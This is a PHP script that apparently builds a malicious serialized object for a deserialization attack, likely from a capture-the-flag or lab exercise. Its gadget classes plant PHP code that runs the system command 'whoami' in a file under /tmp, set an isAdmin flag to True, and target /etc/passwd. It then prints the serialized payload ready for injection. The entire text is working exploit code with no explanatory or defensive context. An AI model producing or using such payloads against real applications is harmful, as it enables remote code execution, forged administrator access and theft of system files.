<?php
class LogFile
{
	public function __construct()
	{
		$this->filename = "/tmp/test/ok";
		$this->username = '<?php system("whoami"); ?>';
	}
}
class ReadFile
{
	public function __construct()
	{
		$this->filename = "/etc/passwd";
	}
}
class User
{
	public function __construct()
	{
		$this->username = new LogFile();
		$this->isAdmin = True;
	}
}

$obj = new User();
echo serialize($obj);
echo "\n";
?>
